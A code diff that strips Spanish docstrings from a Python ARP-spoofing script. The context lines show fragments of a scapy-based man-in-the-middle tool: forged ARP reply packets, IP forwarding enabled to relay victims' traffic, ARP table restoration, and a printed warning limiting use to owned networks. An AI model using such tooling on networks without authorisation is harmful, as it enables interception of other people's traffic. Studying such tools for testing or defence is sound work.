@@ -45,7 +45,7 @@ def get_mac(ip):
         return None
 
 def restore_arp_tables(target_ip, gateway_ip):
-    """Restaura las tablas ARP a su estado original"""
+ 
     print(f"\n[+] Restaurando tablas ARP...")
     
     target_mac = get_mac(target_ip)
@@ -67,7 +67,7 @@ def restore_arp_tables(target_ip, gateway_ip):
         print(f"[!] No se pudieron restaurar completamente las tablas ARP")
 
 def spoof(target_ip, target_mac, spoof_ip, spoof_mac, spoof_mac_src=None):
-    """Envía paquete ARP spoofed"""
+   
     if spoof_mac_src:
  
         packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, 
@@ -79,7 +79,7 @@ def spoof(target_ip, target_mac, spoof_ip, spoof_mac, spoof_mac_src=None):
     scapy.send(packet, verbose=False)
 
 def enable_ip_forwarding():
-    """Habilita el forwarding de IP para permitir que el tráfico fluya"""
+   
     import platform
     system = platform.system()
     
@@ -116,7 +116,7 @@ def print_banner():
     print(banner)
 
 def confirm_execution():
-    """Pide confirmación antes de ejecutar"""
+
     print("[!] ADVERTENCIA: Este script realiza ARP spoofing.")
     print("[!] Solo use en redes propias con fines educativos.")
     print("[!] El uso no autorizado es ILEGAL.")
